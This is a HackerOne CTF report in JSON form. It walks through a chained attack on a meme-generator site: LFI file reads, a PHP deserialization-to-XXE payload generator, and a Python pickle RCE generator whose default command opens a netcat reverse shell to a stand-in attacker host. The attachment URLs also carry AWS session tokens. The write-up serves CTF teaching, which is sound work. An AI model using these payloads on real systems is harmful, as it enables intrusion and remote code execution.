{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2018-10-08T15:31:51.142Z", 
    "voters": [
        "putsi", 
        "muon4", 
        "0xacb", 
        "eveeez", 
        "mygf", 
        "japz", 
        "den1al", 
        "cryptographer", 
        "iheb_hamad", 
        "jatacheers", 
        "and 1 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 415092, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2018-10-22T16:01:59.643Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}", 
    "is_member_of_team?": null, 
    "vote_count": 11, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2018-11-07T15:31:51.180Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/641/50fed91956172a83bada803217bb7206d4369ba7/classes.php?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=15b9f96a82d79992680e044d88b76a053a120052ed8dce5bace0e07caba03bf5", 
                    "type": "text/x-php", 
                    "id": 351641, 
                    "filename": "classes.php"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/632/76b616f7eb17e9a7534efe1428f4e8599117eedf/1.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1d320493ce1f06a750125f678cf2032b5b6ec314fad6951c8c7c8aa664c8afaa", 
                    "type": "image/jpeg", 
                    "id": 351632, 
                    "filename": "1.jpg"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/631/4fb9e7d9cb8c74980d1c253a4e6de9af85ea8cf0/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5d4c61a698bada07b024d6da2476342a6d36a483aa3a816227238fe8275e6d63", 
                    "type": "image/png", 
                    "id": 351631, 
                    "filename": "2.png"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/630/4ec4a49b34b327cd1252033919e105805cc8c99a/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bda861085b276d15613e2abb15d7412af7f10b428bd8ab7b7e1c97f34d86faf3", 
                    "type": "image/png", 
                    "id": 351630, 
                    "filename": "3.png"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/629/699d7e5853282e9bb4e1d90acefd2362dd3c7806/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e4c6f428c40b49d5eb54455f8a2837b688708e346c1babeb5595d02a9e140e18", 
                    "type": "image/png", 
                    "id": 351629, 
                    "filename": "4.png"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/628/0bbdcac9115a0725605360302496268b54005dcc/5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9539376bb331f9f91ebe418bbc6009b9c5c3b6b5b27f4d01054761573cfbefbc", 
                    "type": "image/png", 
                    "id": 351628, 
                    "filename": "5.png"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/627/77143d2e86b3ee76819b9d6f7d66b884c4a8a5dc/6.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=93b66e1f6a9816b67d8f53fc45f7df388c9c760f58e928ecfba3762afb8e8ef5", 
                    "type": "image/png", 
                    "id": 351627, 
                    "filename": "6.png"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/626/347d5096268e757ed43a58ed19bc8710a92c9613/8.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=75a92f497f204a43fb6f6b6d592decb07c66fa69336d278343c1912ed8b958ea", 
                    "type": "image/png", 
                    "id": 351626, 
                    "filename": "8.png"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/625/92ca2355abb91800d80f5578290bd154850f0cdc/7.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221523Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=57a54743a9f92a3e710e9c06281ef70007ff4e03790acfb96eeaedc4c8baf0ef", 
                    "type": "image/png", 
                    "id": 351625, 
                    "filename": "7.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2018-09-26T22:21:00.351Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-09-26T22:35:15.997Z", 
            "actor": {
                "username": "putsi", 
                "url": "/putsi", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "h1-5411-ctf", 
            "message": "# CTF \n\nThe CTF was announced on Twitter via a picture. First step was to find out where the initial website is and we can see that there is a QR-code on the picture:\n\n{F351632}\n\nThe text in QR-code can be revealed with any barcode reader and will result in `https://h1-5411.h1ctf.com`.\nThe website seems contain a cool meme generator app which allows visitors to create memes and view own created memes.\nIn the meme creation functionality, the user can provide top and bottom text for the meme and can use various meme templates.\n\nThese meme templates are either images or fully text-based memes and the HTTP-request related to the generation looks something like the following:\n\n```\nPOST /api/generate.php HTTP/1.1\nHost: h1-5411.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://h1-5411.h1ctf.com/generate.php\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 64\nCookie: PHPSESSID=SESS_ID_HERE\nDNT: 1\nConnection: close\n\ntemplate=template4.txt&type=text&top-text=top&bottom-text=bottom\n```\n\nThe value of `template`-param looks awfully similar to a filename so I tested for a simple LFI with value `../templates/template4.txt` and `../nonexisting/template4.txt`.\nThe server response confirmed, that the LFI exists as the payload with `templates`-directory was accepted.\n\nNow by supplying a local file such as `../../../../../../etc/passwd`, I could view the file content on `Your memes`-page:\n\n{F351630}\n\nBy using the LFI, I could download PHP source code files for the application which allowed source code auditing for further vulnerabilities.\nThe `includes/header.php`-file was examined and it disclosed some interesting hidden PHP-files:\n\n```\n<?php\n  $pages = [\n    \"generate.php\" => \"Meme Generator\",\n    \"memes.php\" => \"Your Memes\",\n    // for version 2.0\n    // \"import_memes_2.0.php\" => \"Import Memes\",\n    // \"export_memes_2.0.php\" => \"Export Memes\"\n  ];\n?>\n```\n\nThe files can be accessed with web browser and look like below:\n\n{F351629}\n\n{F351628}\n\nThe `export_memes_2.0.php`-functionality could be used to download a memedump file, which contained a base64-encoded string. After base64 decoding (`cat 1537985183_export.memepak |base64 -d`), the file content looked like this:\n\n```\na:12:{i:0;s:48:\"https://giphy.com/embed/Vuw9m5wXviFIQ?try_harder\";i:1;s:93:\"../data/memes/1537983470-a0c039413128d3221edc093bdcf24679318016d17d3db61763b25475736a0cbb.txt\";i:2;s:93:\"../data/memes/1537983495-aa28dd914d7d01237e12da26261d5f4d771cb18e3649f68005dd0c27c6c1287d.txt\";i:3;s:93:\"../data/memes/1537983517-84656938c714801a895a51ab86ceafa1c328be447202e5a371876d07b060b851.txt\";i:4;s:93:\"../data/memes/1537983534-4ac7dad991b0d1709625d7a68c59e7c6f679d322c0878460dafeb4e36318ef2f.txt\";i:5;s:93:\"../data/memes/1537983563-210bb9e4f61c7f5c57ee966d5e57f9d64cad68ce50d446b545bffaef83f73392.txt\";i:6;s:93:\"../data/memes/1537983663-d82c657111d6c2329580cf4522cf4603d86769bf7d6a38cc9b9c14b5998e1726.txt\";i:7;s:93:\"../data/memes/1537983665-588c0a89602b5d9fbc1404831fc5e241c4b4cebcc6e55060a7b5f4c9d084bb5f.txt\";i:8;s:93:\"../data/memes/1537983700-790cb74d36ae7960e3f20299faba87f79404d5fc6d9151b43b4649f77c8ab7f8.txt\";i:9;s:93:\"../data/memes/1537983704-714fd76ee28db5e95e5cc0a46ad083569a6c428a4e97a7cd2bc3d84a80317678.txt\";i:10;s:93:\"../data/memes/1537983753-86db46d0fb6b0a1f6ff52bf55a07d59845f8c282b2fa6b25fa80f2c733d39e1c.txt\";i:11;s:93:\"../data/memes/1537983756-8314e336fabb78250094d766914a579e4d7da95198ef4f3397ee6ddd92fd9cb2.txt\";}\n```\n\nA trained eye can see pretty quickly that these are serialized PHP-objects. This same file could be imported with the `import_memes_2.0.php`-functionality which would add the memes to the `Your memes`-section.\n\nPHP-serialization functionalities lead fairly often to severe remote code execution bugs, so I decided to dig in and check if such exploit could be crafted.\nThe `includes/classes.php`-file ( {F351641} ) contains various classes which were examined and the `ConfigFile`-class looked like it could be used in the RCE exploit.\nThe class has the following functions:\n- `__construct` is the class constructor and it takes an URL which is downloaded and the page content is set as a value for the class object variable `config_raw`.\n- `parse` tries to parse XML-data from the `config_ra\u1e81` and places values from it to the class object variables `top_text`, `bottom_text`, `template`, and `type`.\n- `generate` generates an meme file from the XML-data.\n- `__toString` runs `parse` and then returns a textual representation of the data parsed from the XML.\n\nThe file also sets `libxml_disable_entity_loader(false);` which allows XML Entity declarations to be evaluated. This means that the parser is vulnerable to XXE-attacks.\nThere is also a commented class `Maintenance` on the file with comment `Maintenance service: internal service on localhost, still under development!!`.\n\nBy combining the above observations, I assumed that the PHP Object RCE should be used to launch an XXE attack towards the internal service.\n\nThe below file was then crafted for the purpose of creating such serialized and base64-encoded PHP objects:\n\n```\n<?php\n  libxml_disable_entity_loader(false);\n\n  class ConfigFile {\n    function __construct($url) {\n      $this->config_raw = '<?xml version=\"1.0\" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM \"' . $url . '\">]><dom><toptext>&sp;</toptext><bottomtext>bottom</bottomtext><template>aaa</template><type>2</type></dom>';\n    }\n  }\n\n\n$url = \"http://9cmzrgnaj6ydayoskjbmxlhv4maey3.burpcollaborator.net\";\n$serialized = base64_encode(serialize([new ConfigFile($url)]));\necho $serialized;\n\n?>\n```\n\nNext step was to test the above exploit. I created a payload which contained a Burp Collaborator URL as an external entity and sent the payload via the import-functionality.\nNow when the `Your memes`-page was opened, the payload object was unserialized and the `__tostring`-function was ran which then ran the `parse`-functionality.\nThis resulted in the Burp Collaborator getting an interaction from the server:\n\n{F351627}\n\nGreat! We can now XXE through RCE :D\n\nNext step was to figure out the port where the internal service is located. I was lazy and did not want to portscan with the XXE so I used the LFI-vulnerability to download the `/proc/net/tcp`-file which disclosed all listening ports. There was only one port listening and it was `1337`. \nThe XXE was used to connect to this port and the HTTP-response could be seen in the `Your memes`-page on the specific meme's section:\n\n{F351625}\n\nThe service contained two functionalities:\n- `/status` which showed the current maintenance status.\n- `/update-status` which could be used to update the maintenance status somehow.\n\nBoth of the functionalities supported `debug` GET-parameter which results in seeing some additional debug messages on the HTTP-responses.\nBy sending a request (again with the XXE) towards `http://127.0.0.1:1337/status?debug=true`, the server returned the following response:\n\n```\nMaintenance mode: off | Debug: KGlhcHAKU3RhdHVzCnAxCihkcDIKUydtZXNzYWdlJwpwMwpTJ01haW50ZW5hbmNlIG1vZGU6IG9mZicKcDQKc1MnbWFpbnRlbmFuY2UnCnA1CkkwMApzYi4=\n```\n\n\nBase64-decoding revealed a Pickle-serialized Python object:\n\n```\n(iapp\nStatus\np1\n(dp2\nS'message'\np3\nS'Maintenance mode: off'\np4\nsS'maintenance'\np5\nI00\nsb.\n```\n\nNow through some trial and error, I detected that the `/update-status`-page accepts GET-parameter `status` in which the base64-encoded serialized Python-object could be sent.\nThis can be exploited in a similar way as the PHP serialization but will gain an actual OS-command execution possibility. It is also a bit simpler to exploit than the PHP-serialization, as we do not need to use any existing imported classes.\n\nThe following RCE-payload generator was used (source: https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd) to generate the Pickle serialized payload:\n\n```\nimport cPickle\nimport sys\nimport base64\n\nDEFAULT_COMMAND = \"nc -e /bin/sh ATTACKER_SERVER_DOMAIN 8080\"\nCOMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND\n\nclass PickleRce(object):\n    def __reduce__(self):\n        import os\n        return (os.system,(COMMAND,))\n\nprint base64.b64encode(cPickle.dumps(PickleRce()))\n```\n\nNow when the payload was sent to the `/update-status`-page in the `status`-parameter, the application deserialized it and executed the netcat which connected to my server with a reverse shell:\n\n{F351626}\n\n\nTL;DR: \n1. Gain information of target via LFI.\n2. Chain PHP Object deserialization + XXE + Python object deserialization to gain OS-command access to a internal host. \n", 
            "markdown_message": "<h1 id=\"ctf\">CTF</h1>\n\n<p>The CTF was announced on Twitter via a picture. First step was to find out where the initial website is and we can see that there is a QR-code on the picture:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"1.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/632/76b616f7eb17e9a7534efe1428f4e8599117eedf/1.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHH